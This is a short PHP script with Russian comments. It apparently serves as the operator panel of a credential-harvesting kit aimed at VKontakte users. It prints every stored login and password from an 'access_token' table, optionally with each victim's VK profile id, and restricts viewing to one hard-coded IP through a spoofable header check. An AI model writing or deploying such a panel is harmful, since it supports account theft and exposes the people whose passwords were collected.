<?php

include("bd.php");

define('MY_IP', "31.173.242.14"); // Твой ип с ip.ru
define('IDVK', "0"); // Выводить ид в вк? 0 - нет, 1 - да

function getIP()
{
    if (isset($_SERVER['HTTP_X_REAL_IP']))
        return $_SERVER['HTTP_X_REAL_IP'];
    return $_SERVER['REMOTE_ADDR'];
}
if (!in_array(getIP(), array(
    '' . MY_IP . ''
))) {
    die("Отказано в доступе!");
}

$ret = mysql_query("SELECT * FROM access_token");
if (mysql_num_rows($ret) > 0) {
    if (!isset($_GET[edit])) {
        $ren = mysql_fetch_array($ret);
        do {
            if (IDVK == 1) {
                $idvks = " (vk.com/id" . $ren['owner_id'] . ")";
            } else {
                $idvks = "";
            }
            echo "" . $ren['login'] . ":" . $ren['pass'] . "" . $idvks . "<br>";
        } while ($ren = mysql_fetch_array($ret));
    }
}
?>